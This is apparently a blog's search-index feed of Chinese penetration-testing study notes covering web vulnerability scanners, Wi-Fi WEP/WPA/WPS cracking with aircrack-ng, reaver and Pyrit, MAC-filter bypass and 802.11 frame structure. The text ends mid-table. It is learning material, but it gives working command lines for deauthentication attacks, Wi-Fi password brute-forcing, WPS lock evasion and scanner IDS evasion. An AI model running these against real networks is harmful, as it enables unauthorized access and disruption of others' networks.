<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web扫描工具-Nikto、Vega、Skipfish</title>
      <link href="/2020/10/11/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Nikto%E3%80%81Vega%E3%80%81Skipfish/"/>
      <url>/2020/10/11/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Nikto%E3%80%81Vega%E3%80%81Skipfish/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB攻击面"><a href="#WEB攻击面" class="headerlink" title="WEB攻击面"></a>WEB攻击面</h3><ul><li>Network</li><li>OS</li><li>Web Server</li><li>App Server</li><li>Web Application</li><li>Database</li><li>Browser</li></ul><a id="more"></a><h3 id="协议基础"><a href="#协议基础" class="headerlink" title="协议基础"></a>协议基础</h3><ul><li>明文<ul><li>无内建的机密安全机制</li><li>嗅探或代理截断可查看全部明文信息</li><li>https只能提高传输层安全</li></ul></li><li>无状态<ul><li>每一次客户端和服务端的通信都是独立的过程</li><li>WEB应用需要跟踪客户端会话（多步通信）</li><li>不使用cookie的应用，客户端每次请求都要重新身份验证</li><li>Session用于在用户身份验证后跟踪用户行为轨迹<ul><li>提高用户体验，但增加了攻击向量</li></ul></li></ul></li><li>Cycle<ul><li>请求/响应</li></ul></li><li>重要的header<ul><li>响应头：<ul><li>Set-Cookie：服务器发给客户端的SessionID(被窃取的风险)</li><li>Content-Length：响应body部分的字节长度(爆破时通过该字段判断页面变化)</li><li>Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面</li></ul></li><li>请求头：<ul><li>Cookie：客户端发回给服务器证明用户状态的信息（头-值，成对出现）</li><li>Referrer：发起新请求之前用户位于那个页面，服务器基于此头的安全限制很容易被修改绕过</li></ul></li></ul></li><li>状态码：<ul><li>100s、200s、300s、400s、500s</li></ul></li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>Metasploitable<ul><li>Dvwa</li></ul></li></ul><h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><ul><li>Httrack<ul><li>将web上所有可访问的页面都copy下来</li><li>减少与目标系统交互</li></ul></li></ul><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h4><ul><li>perl语言开发的开源web安全扫描器</li><li>web服务器使用的软件版本</li><li>搜索存在安全隐患的文件</li><li>服务器配置漏洞</li><li>WEB Application层面的安全隐患</li><li>避免404误判<ul><li>很多服务器不遵守RFC标准，对于不存在的对象返回200</li><li>依据响应文件内容判断，不同拓展名的404文件响应内容不同</li><li>去除时间信息后的内容取MD5值</li><li>-no404</li></ul></li><li><a href="https://cirt.net/Nikto2" target="_blank" rel="noopener">https://cirt.net/Nikto2</a></li><li>操作：<ul><li><code>nikto -list-plugins</code></li><li><code>nikto -host http://1.1.1.1</code></li><li><code>nikto -host 192.168.1.1 -ssl -port 443,8443,995</code></li><li><code>nikto -host host.txt</code></li><li><code>nmap -p80 102.168.1.0/24 -oG -|nikto -host -</code></li><li><code>nikto -host 192.168.1.1 -useproxy http://localhost:8087</code></li><li><code>-vhost</code></li><li>interative:<ul><li>v -verbose mode on/off</li><li>d -debug mode on/off</li><li>e -error reporting on/off</li><li>p -progress reporting on/off</li><li>P -pause</li><li>r -redirect display on/off</li><li>c -coocie display on/off</li><li>a -auth display on/off</li><li>q -quit</li><li>N -next host</li></ul></li><li>配置文件：etc/nikto.conf<ul><li>修改UserAgent</li><li>STATIC-COOKIE=”cookie1=value”;”cookie2=value”</li></ul></li><li>-evasion:使用LibWhisker种对IDS的躲避技术，可以使用一下几种类型<ul><li><ol><li>随机URL编码（非UTF-8）</li><li>子选择路径（/./）</li><li>过早结束的URL</li><li>优先考虑长随机字符串</li><li>参数欺骗</li><li>使用TAB作为命令的分隔符</li><li>使用变化的URL</li><li>使用Windows路径分隔符“\”</li></ol></li></ul></li></ul></li></ul><h4 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h4><ul><li><p>Java编写的开源Web扫描器</p></li><li><p>扫描模式</p></li><li><p>代理模式</p></li><li><p>爬站、处理表单、注入测试</p></li><li><p>subgraph.com/vega</p></li><li><p>先手动爬，然后跑扫描。</p></li></ul><h4 id="Skipfish"><a href="#Skipfish" class="headerlink" title="Skipfish"></a>Skipfish</h4><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快<ul><li>多路单线程，全异步网络I/O,消除内存管理和调度开销</li><li>启发式自动内容识别</li></ul></li><li>误报较低</li></ul><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><ul><li><code>skipfish -o test http://1.1.1.1</code></li><li><code>skipfish -o test @url.txt</code></li><li><code>skipfish -o test -S complet.wl -W a.wl http://1.1.1.1</code><ul><li><code>dpkg -L skipfish | grep wl</code>得到skipfish自带的字典</li><li>通过-S指定使用的字典，-W保存爬的过程中发现的特殊字符，目录，到指定字典。</li></ul></li><li>-I （大写i）只检查匹配 ‘string’ 的url</li><li>-X 不检查匹配 ‘string’ 的url</li><li>-K 不对指定参数进行Fuzz测试</li><li>-D 跨站点爬另外一个域，如果有链接连接到这里，就会扫。</li><li>-l (小写L) 每秒最大请求书</li><li>-m 每IP最大并发连接数</li><li>–config 指定配置文件</li><li>身份认证<ul><li><code>skipfish -A user：pass -o test http://1.1.1.1</code></li><li><code>skipfish -C &quot;name=val&quot; -C &quot;name2=value2&quot; -o test http://1.1.1.1</code></li><li>-auth-form -auth-user -auth-pass -auth-verify-url等，查看help</li></ul></li><li>扫描结束太快<ul><li>触发了目标站点的连接数限制，降低-m -l数值</li></ul></li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>代理：Hidemyass</li><li>书：《Web penetration test with kali Linux》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线渗透实操-Aircrack-ng-WPA/WPS</title>
      <link href="/2020/10/08/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WPA-WPS/"/>
      <url>/2020/10/08/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WPA-WPS/</url>
      
        <content type="html"><![CDATA[<h2 id="无线渗透实操——Aircrack-ng-WPA-WPS"><a href="#无线渗透实操——Aircrack-ng-WPA-WPS" class="headerlink" title="无线渗透实操——Aircrack-ng(WPA/WPS)"></a>无线渗透实操——Aircrack-ng(WPA/WPS)</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li>启动monitor模式</li><li>开始抓包并保存<ul><li><code>airodump-ng wlan0mon -c&lt;channel&gt; --bssid&lt;bssid&gt; -w&lt;filename&gt;</code></li></ul></li><li>Deauthentication攻击获取四步握手信息<ul><li><code>aireplay-ng -0 &lt;count&gt; -a &lt;ap mac&gt; -c &lt;sta mac&gt; wlan0mon</code></li></ul></li><li>字典暴破<ul><li><code>aircrack-ng -w /user/share/john/password.list wpa-01.cap</code></li></ul></li></ul><a id="more"></a><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><ul><li>网上共享的字典</li><li>数据泄露</li><li>地区电话号码字段</li><li>Crunch生成</li><li>Kali中自带的</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>Essid+PSK+迭代次数4096——Hash计算生成PMK（十分消耗CPU时间）</li><li>PMK+Anounce+Snounce+MAC1+MAC2计算出PTK</li></ul><h3 id="Airolib"><a href="#Airolib" class="headerlink" title="Airolib"></a>Airolib</h3><ul><li>先计算生成所有的PMK（计算资源消耗）</li><li>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</li><li>通过完整性摘要值找到正确的PTK，再找到生成该PTK的PMK及相应的PSK</li><li>SQLite3数据库存储数据</li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li><code>airolib-ng db --import essid essid.txt</code></li><li><code>airolib-ng db --stats</code></li><li><code>airolib-ng db --import passwd /usr/share/wordlists/rockyou.txt</code></li><li><code>airolib-ng db --batch</code> 计算PMK</li><li><code>aircrack-ng -r db wpa-02.cap</code></li></ul><h3 id="John-the-ripper"><a href="#John-the-ripper" class="headerlink" title="John the ripper"></a>John the ripper</h3><ul><li>快速的密码破解软件</li><li>支持基于规则动态生成密码字典</li><li>很多人喜欢用手机号做无线密码<ul><li>获取号段并动态增加后几位数字</li></ul></li><li>配置文件/etc/john/john.conf<ul><li>[List.Rules:Wordlist]</li><li>$[0-9]$[0-9]$[0-9]$[0-9]</li></ul></li><li><code>john --wordlist=yidong.txt --rules --stdout | aircrack-ng -e kifi -w - wpa-01.cap</code></li></ul><h3 id="Cowpatty"><a href="#Cowpatty" class="headerlink" title="Cowpatty"></a>Cowpatty</h3><ul><li>同样用字典生成彩虹表再爆破</li></ul><h3 id="Pyrit"><a href="#Pyrit" class="headerlink" title="Pyrit"></a>Pyrit</h3><ul><li>与airolib、cowpatty相同、支持基于预计算的PMK提高破解速度</li><li>独有的优势<ul><li>可以利用GPU</li><li>本身支持抓包获取四步握手，无需使用Airodump</li><li>支持读取airodump抓包获取四步握手的方式</li></ul></li><li>只抓WAP四次握手过程包<ul><li><code>pyrit -r wlan0mon -o wpapyrit.cap stripLive</code></li><li><code>pyrit -r wpapyrit.cap analyze</code></li></ul></li><li>从airodump抓包导入并筛选<ul><li><code>pyrit -r wpa.cap -o wpapyrit.cap strip</code></li></ul></li><li>使用密码直接破解<ul><li><code>pyrit -r wpapyrit.cap -i password.list -b&lt;AP MAC&gt; attack passthrough</code></li></ul></li><li>数据库模式破解<ul><li>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</li><li>查看默认数据库状态:<code>pyrit eval</code></li><li>导入密码字典：<code>pyrit -i password.list import passwords</code></li><li>指定ESSID：<code>pyrit -e kifi create essid</code></li><li>计算PMK：<code>pyrit batch</code>(发挥GPU计算能力)</li><li>破解密码：<code>pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack db</code></li></ul></li></ul><h2 id="WPS-Wireless-Protected-Setup"><a href="#WPS-Wireless-Protected-Setup" class="headerlink" title="WPS(Wireless Protected Setup)"></a>WPS(Wireless Protected Setup)</h2><ul><li>WPS是WiFi联盟2006年开发的一项技术<ul><li>通过PIN码来简化无线接入的操作，无需记住PSK</li><li>路由器和网卡各按一个按钮就能接入无线</li><li>PIN码是分为前后各4位的2段共8位数字</li></ul></li><li>安全漏洞<ul><li>2011年被发现安全涉及漏洞</li><li>接入发起方可以根据路由器的返回信息判断前四位是否正确</li><li>而PIN码的后4位只有1000种定义的组合（最后一位是checksum）</li><li>所以全部穷举破解只需要11000次尝试<ul><li>PSK：218340105584896次</li></ul></li><li>标准本身没有设计锁定机制，目前多个厂商已经实现锁定机制。</li></ul></li></ul><h4 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h4><ul><li>启动侦听模式，发现支持WPS的AP<ul><li><code>wash -C -i wlan0mon</code></li><li><code>airodump-ng wlan0mon --wps</code></li></ul></li><li>爆破pin码<ul><li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -c &lt;channel&gt;</code> </li></ul></li><li>秒破PIN<ul><li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -K 1</code></li><li>上面的命令其实调用的是<code>pixiewps</code></li><li>只适用于固定厂商的芯片，成功率低</li></ul></li><li>从pin码获得密码<code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -p 88888888</code></li><li>问题：<ul><li>很多厂家实现了锁定机制，所以爆破时应注意限速</li><li>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</li></ul></li><li>综合自动化无线密码破解工具wifite</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>插入网卡前先执行</p><ul><li><code>service NetworkManager stop</code></li><li><code>airmon-ng check kill</code></li></ul><p>否则插入网卡后wpa_supplicant会对网卡进行初始化，导致操作失败</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线渗透实操--Aircrack-ng:WEP</title>
      <link href="/2020/10/06/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WEP/"/>
      <url>/2020/10/06/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WEP/</url>
      
        <content type="html"><![CDATA[<h2 id="无线渗透实操——Aircrack-ng-WEP"><a href="#无线渗透实操——Aircrack-ng-WEP" class="headerlink" title="无线渗透实操——Aircrack-ng(WEP)"></a>无线渗透实操——Aircrack-ng(WEP)</h2><h3 id="Airmon-ng"><a href="#Airmon-ng" class="headerlink" title="Airmon-ng"></a>Airmon-ng</h3><ul><li><code>airmon-ng start wlan0</code> wlan0开启侦听模式，可以在后面加数字表示在某个信道开启</li><li><code>iwlist wlan2mon channel</code>查看网卡工作在哪个信道</li><li><code>airmon-ng stop wlan0mon</code>关闭侦听模式，重新开启managed模式</li><li><code>airmon-ng check kill</code>关闭影响aircrack-ng的进程</li></ul><a id="more"></a><h3 id="Airodump-ng"><a href="#Airodump-ng" class="headerlink" title="Airodump-ng"></a>Airodump-ng</h3><ul><li><p><code>airodump-ng wlan0mon</code>开启hook模式，会显示附近的AP和STA及相关信息</p><ul><li><p>-c 参数工作在指定信道，否则是所有信道。</p></li><li><p>–bssid 3C:A5:81:28:34:24 指定bssid</p></li><li><p>-w 抓包结果写入某个文件</p></li><li><p>–ivs 只会抓wep中存有ivs的数据包</p></li><li><p>抓包结果：<img src="/2020/10/06/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D-Aircrack-ng-WEP/pic01.png" alt="截图"></p><ul><li>BSSID：Ap的MAC地址</li><li>PWR：网卡接收到的信号强度，距离越近，信号越强<ul><li>-1：驱动不支持信号强度，STA距离超出信号接受范围</li></ul></li><li>RXQ：最近10秒成功接收的数据帧的百分比（数据帧，管理帧），只有在固定信道时才会出现</li><li>Beacons：AP发出的beacon帧数量</li><li>#Data：抓到的数据帧数量</li><li>#/s：最近10秒内，平均每秒抓到的帧的数量</li><li>CH：信道号（从beacon帧中获得），当信道重叠时可能发现其它信道的AP</li><li>MB：AP支持的最大速率</li><li>ENC：采用的无线安全技术：WEP、WPA、WPA2、OPEN</li><li>CIPHER：采用的加密套件：CCMP、TKIP、WEP40、WEP104</li><li>AUTH：身份认证方法MGT、PSK、SKA、OPEN</li><li>ESSID:无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP</li><li>STATION：STA的MAC地址</li><li>Lost：通过sequence number判断最近10秒station丢包数量<ul><li>干扰（微波炉）、距离</li><li>发包不能收，收包不能发</li></ul></li><li>Frames：STA发送的数据包数量</li><li>Probes：STA发送的prob帧</li></ul></li></ul></li></ul><h3 id="Aireplay-ng"><a href="#Aireplay-ng" class="headerlink" title="Aireplay-ng"></a>Aireplay-ng</h3><ul><li><p>产生或者加速无线通信流量</p><ul><li>向无线网络中注入数据包<ul><li>伪造身份验证</li><li>强制重新身份验证</li><li>抓包重放</li></ul></li><li>用于后续WEP和WPA密码破解</li><li>支持10种包注入</li></ul></li><li><p>获取包的两种途径</p><ul><li>指定接口（-i）</li><li>抓包文件pcap（-r）</li></ul></li><li><p>aireplay-ng &lt;options&gt;&lt;interface name&gt;</p></li><li><p>Filter命令选项（除0、1两种攻击方式）</p></li></ul><h4 id="修改mac地址"><a href="#修改mac地址" class="headerlink" title="修改mac地址"></a>修改mac地址</h4><ul><li>kali可以直接在操作系统图形界面修改，参考下面”MAC绑定绕过“</li><li>也可以命令行修改，不过用这种方式在kali修改后，连接wifi会被NetworkManager再次改回去- -。</li></ul><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig wlan0mon down<br>macchanger -m 00:11:11:11:11:11 wlan0mon<br>ifconfig wlan0mon up<br></code></pre></td></tr></table></figure><h4 id="测试网卡注入"><a href="#测试网卡注入" class="headerlink" title="测试网卡注入"></a>测试网卡注入</h4><ul><li><p><code>aireplay-ng -9 wlan0mon</code></p></li><li><p><code>aireplay-ng -9 -e xxxx -a mac:mac:x:x:x:x wlan0mon</code></p></li></ul><h3 id="MAC绑定绕过"><a href="#MAC绑定绕过" class="headerlink" title="MAC绑定绕过"></a>MAC绑定绕过</h3><ul><li><p><code>airmon-ng stop wlan0mon</code> 先关闭之前的监听</p></li><li><p><code>airmon-ng start wlan0 9</code> 在指定信道上开启</p></li><li><p><code>airodump-ng wlan0mon -c 9</code> airodump-ng监听</p><ul><li>–bissid指定AP</li></ul></li><li><p>在Kali右键NetworkManager–&gt;edit Connections–&gt;要连接的网络–&gt;Wi-Fi–&gt;Cloned MAC address–&gt;填入已经连接上AP的mac</p></li><li><p>重新连接该网络，发现可以连接上。此时网络质量很差，因为两个STA都可以接收到对方的数据包。当其中一个mac下线后，另一个就可以正常上网。</p></li></ul><h3 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h3><h4 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h4><ul><li><p>WEP密码破解原理</p><ul><li>IV并非完全随机</li><li>每2的24次方个包可能出现一次IV重用</li><li>收集大量IV之后找出相同IV集齐对应密文，分析得出共享密码</li></ul></li><li><p>ARP回包中包含IV</p></li><li><p>IV足够多的情况下，任何复杂程度的WEP密码都可以被破解。</p></li><li><p>流程：</p><ul><li>启动monitor模式</li><li>启动抓包并保存抓包<ul><li><code>airodump-ng wlan0mon -c&lt;channel&gt; --bssid&lt;bssid&gt; -w&lt;filename&gt;</code></li></ul></li><li>Deauthentication触发一次其它STA的连接过程，抓包计算出keystream,即XOR文件。（用来加密AP发来的challenge，与AP建立关联需要指定XOR文件）<ul><li><code>aireplay-ng -0 &lt;count&gt; -a &lt;ap mac&gt; -c &lt;sta mac&gt; wlan0mon</code></li><li>攻击过程中信号强度PWR为0</li></ul></li><li>利用XOR文件与AP建立关联(建立关联后才能执行之后的操作)<ul><li><code>aireplay-ng -1 60 -y xor -a apmac -h mymac wlan0mon</code></li></ul></li><li>执行ARP重放<ul><li>目的是收集IV值</li><li>64位20w,128位150w数据，效率较高。（实际上十几w,几秒钟就破解了）</li><li>开始发送ARP包<code>aireplay-ng -3 -b apmac -h mymac wlan0mon</code></li><li>Deauthentication触发ARP数据包<code>aireplay-ng -0 2 -a apmac -c stamac wlan0mon</code></li></ul></li><li>收集足够DATA后破解密码,可以边抓包边破解<ul><li>aircrack-ng wep-01.cap</li><li>破解完成</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEP/WPA工作原理</title>
      <link href="/2020/10/04/WEP-WPA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2020/10/04/WEP-WPA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="WEP-WPA工作原理"><a href="#WEP-WPA工作原理" class="headerlink" title="WEP/WPA工作原理"></a>WEP/WPA工作原理</h2><h3 id="WEP加密"><a href="#WEP加密" class="headerlink" title="WEP加密"></a>WEP加密</h3><ul><li>使用Rivest Cipher4（RC4）算法加密流量内容，实现机密性</li><li>CRC32算法检查数据完整性</li><li>标准采用使用24位initialization vector（IV）</li></ul><a id="more"></a><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><ul><li>RSA实验室研发的对称加密流算法<ul><li>实现简单</li><li>速度快</li></ul></li><li>加密：对明文流和密钥流进行XOR计算</li><li>解密：对密文流和密钥流进行XOR计算</li><li>RC4算法key由两个过程生成<ul><li>合并IV和PSK，利用Key Scheduling Algorithm（KSA）算法生成起始状态表。</li><li>Pseudo-Random Generation Algorithm（PRGA）算法生成最终密钥流。</li></ul></li></ul><h3 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h3><ul><li>Wi-Fi Protected Access</li><li>802.11i为提高无限安全，开发两个新的链路层加密协议<ul><li>Temporal Key Integrity Protocol(TKIP)<ul><li>WPA1(较之WEP可动态改变密钥)</li></ul></li><li>Counter Mode with CBC-MAC(CCMP)<ul><li>WPA2</li></ul></li></ul></li><li>WPA加密两种安全类型<ul><li>WPA个人：使用预设共享密钥实现身份认证</li><li>WPA企业：使用802.1x和Radius服务器实现AAA<ul><li>从客户端到AP用EAP协议</li></ul></li></ul></li><li>WPA1<ul><li>802.11i第三版草案</li><li>与WEP比较<ul><li>都采用逐包进行密钥加密</li><li>128位的key和48位的初向量（IV）</li><li>RC4流加密数据</li><li>帧计数器避免重放攻击</li><li>TKIP使用Michael算法进行完整性校验MIC<ul><li>WEP CRC32</li></ul></li><li>兼容早期版本硬件</li></ul></li></ul></li><li>WPA2<ul><li>依据802.11i完全重新设计实现<ul><li>也被称为Robust Security Network（RSN）</li><li>CCMP替代TKIP</li><li>AES加密算法取代了RC4</li><li>不兼容早期版本硬件</li></ul></li></ul></li></ul><h3 id="身份认证（WPA企业）"><a href="#身份认证（WPA企业）" class="headerlink" title="身份认证（WPA企业）"></a>身份认证（WPA企业）</h3><ul><li>身份认证基于Extensible Authentication Protocol（EAP实现）<ul><li>EAP-TLS，需要客户端和服务器证书</li><li>EAP-TTLS</li><li>PEAP混合身份验证，只需要服务器证书</li></ul></li><li>客户端选择身份认证方式</li><li>AP发送身份验证信息给RadiusServer</li><li>Radius Server返回”Radius Accept“表示认证成功<ul><li>其中包含MasterKey（MK）</li></ul></li><li>AP通过EAP消息通知STA认证成功</li></ul><h3 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h3><ul><li><p>无线网络设计用于一组无线通信设备</p><ul><li>关联到同一AP的设备共享无线信道</li><li>单播、广播、组播<ul><li>安全特性要求不同</li><li>单播通信需要单独密钥加密通信双方流量<ul><li>pairwise key：对偶密钥（PTK）（T是temporary，PTK由PMK得出）</li></ul></li><li>组播通信需要信任域内所有成员共享的同一密钥<ul><li>group key：组密钥（GTK）</li></ul></li></ul></li></ul></li></ul><h4 id="PMK"><a href="#PMK" class="headerlink" title="PMK"></a>PMK</h4><ul><li><p>安全上下文的顶级密钥</p><ul><li>MK进行TLS-PRF加密得出PMK<ul><li>基于服务密钥</li></ul></li></ul></li><li><p>由上层身份验证方法服务器生成</p></li><li><p>从服务器通过radius传给AP</p></li><li><p>从AP通过EAP消息传递给所有STA</p><ul><li>基于PSK共享密钥（个人）</li></ul></li><li><p>Essid+PSK+迭代次数4096——Hash计算生成PMK——再生成PTK</p></li><li><p>STA和AP分别计算得出PMK，并不在网络中传递交换</p><ul><li>256位既32字节</li></ul><h4 id="四步握手生成PTK"><a href="#四步握手生成PTK" class="headerlink" title="四步握手生成PTK"></a>四步握手生成PTK</h4></li></ul><ul><li>AP发送Anonce给STA</li><li>STA生成Snonce计算出PTK</li><li>STA发送Snonce加PTK的MIC给AP</li><li>AP拿到Snonce计算出PTk</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK</li><li>AP发GTK给STA</li><li>STA回复ACk并使用密钥加密</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>集中身份验证：<ul><li>Radius</li><li>LADP</li><li>kerberos</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>802.11协议栈帧结构</title>
      <link href="/2020/10/04/802-11%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84/"/>
      <url>/2020/10/04/802-11%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="802-11协议栈帧结构"><a href="#802-11协议栈帧结构" class="headerlink" title="802.11协议栈帧结构"></a>802.11协议栈帧结构</h2><ul><li>首先选择合适的无线网卡</li><li>了解基本操作</li><li>学习协议栈帧结构</li><li>实际抓包查看</li></ul><a id="more"></a><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h4><ul><li><p><code>iw list</code> 查看无线网卡的配置信息</p></li><li><p><code>iwlist wlan0 frequency</code>查看支持的频段</p></li></ul><h4 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a>扫描附近AP</h4><ul><li><p><code>iw dev wlan0 scan</code></p></li><li><p><code>iw dev wlan0 scan|egrep &quot;DS\ Parameter\ set|SSID&quot;</code></p></li><li><p><code>iwlist wlan0 scannign|grep&quot;ESSID|Channel&quot;</code></p></li></ul><h4 id="添加删除侦听端口"><a href="#添加删除侦听端口" class="headerlink" title="添加删除侦听端口"></a>添加删除侦听端口</h4><ul><li><p><code>iw dev wlan0 interface add wlan0mon type monitor</code></p></li><li><p><code>iw dev wlan0mon interface del</code></p></li></ul><h3 id="RADIOTAP头"><a href="#RADIOTAP头" class="headerlink" title="RADIOTAP头"></a>RADIOTAP头</h3><ul><li>802.11帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程</li><li>Linux系统在驱动和API中内建支持Radiotap</li><li>802.11帧发射之前，网卡驱动在802.11头前添加Radiotap头，反之当网卡接收无线帧时，驱动通知MAC层，此帧头包含Radiotap头</li><li>Radiotap为802.11帧传递额外信息，厂家可以自定义，因此头长度不固定</li></ul><h3 id="802-11帧结构"><a href="#802-11帧结构" class="headerlink" title="802.11帧结构"></a>802.11帧结构</h3><ul><li>DU（Data Unit）数据单元，信息传输的最小数据集合</li><li>SDU（Service Data Unit）/PDU（Protocol Data Unit）</li></ul><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><h4 id="帧控制"><a href="#帧控制" class="headerlink" title="帧控制"></a>帧控制</h4><ul><li>Protocol Version(2bit) :802.11协议版本，始终为0，1，2，3</li><li>Type(2bit):规定帧的具体用途（3种类型）：</li></ul><table><thead><tr><th>Type</th><th>Mean</th></tr></thead><tbody><tr><td>00</td><td>管理帧</td></tr><tr><td>01</td><td>控制帧</td></tr><tr><td>10</td><td>数据帧</td></tr><tr><td>11</td><td>保留</td></tr></tbody></table><ul><li>SubType（4bit）</li></ul><table><thead><tr><th>Subtype</th><th>Mean</th><th>Type</th></tr></thead><tbody><tr><td>0000</td><td>Association request（连接请求）</td><td>00</td></tr><tr><td>0001</td><td>Association response（连接应答）</td><td>00</td></tr><tr><td>0010</td><td>Reassociation request（重新连接请求）</td><td>00</td></tr><tr><td>0011</td><td>Reassociation response（重新连接应答）</td><td>00</td></tr><tr><td>0100</td><td>Probe request（探查请求）</td><td>00</td></tr><tr><td>0101</td><td>Probe response（探查应答）</td><td>00</td></tr><tr><td>1000</td><td>Beacon（导引信号）</td><td>00</td></tr><tr><td>1001</td><td>Announcement traffic indication message (ATIM)（数据代传指示通知信号）</td><td>00</td></tr><tr><td>1010</td><td>Disassociation（解除连接）</td><td>00</td></tr><tr><td>1011</td><td>Authentication（身份验证）</td><td>00</td></tr><tr><td>1100</td><td>Deauthentication（解除认证）</td><td>00</td></tr><tr><td><strong>Subtype</strong></td><td><strong>Mean</strong></td><td><strong>Type</strong></td></tr><tr><td></td><td>0000-0110 保留</td><td></td></tr><tr><td>0111</td><td>Control Wrapper</td><td></td></tr><tr><td>1000</td><td>Block Ack Request(BlockAckReq)</td><td></td></tr><tr><td>1001</td><td>Block Ack (BlockAck)</td><td></td></tr><tr><td>1010</td><td>PS-Poll</td><td></td></tr><tr><td>1011</td><td>RTS（请求发送）</td><td>01</td></tr><tr><td>1100</td><td>CTS（允许发送）</td><td>01</td></tr><tr><td>1101</td><td>ACK（应答）</td><td>01</td></tr><tr><td>1110</td><td>CF-End（免竞争期间结束）</td><td>01</td></tr><tr><td>1111</td><td>CF-End（免竞争期间结束）+CF-Ack（免竞争期间回应）</td><td>01</td></tr><tr><td><strong>Subtype</strong></td><td><strong>Mean</strong></td><td><strong>Type</strong></td></tr><tr><td>0000</td><td>Data（数据）</td><td>10</td></tr><tr><td>0001</td><td>Data+CF-Ack</td><td>10</td></tr><tr><td>0010</td><td>Data+CF-Poll</td><td>10</td></tr><tr><td>0011</td><td>Data+CF-Ack+CF-Poll</td><td>10</td></tr><tr><td>0100</td><td>Null data (无数据：未发送数据)</td><td>10</td></tr><tr><td>0101</td><td>CF-Ack (未发送数据)</td><td>10</td></tr><tr><td>0110</td><td>CF-Poll 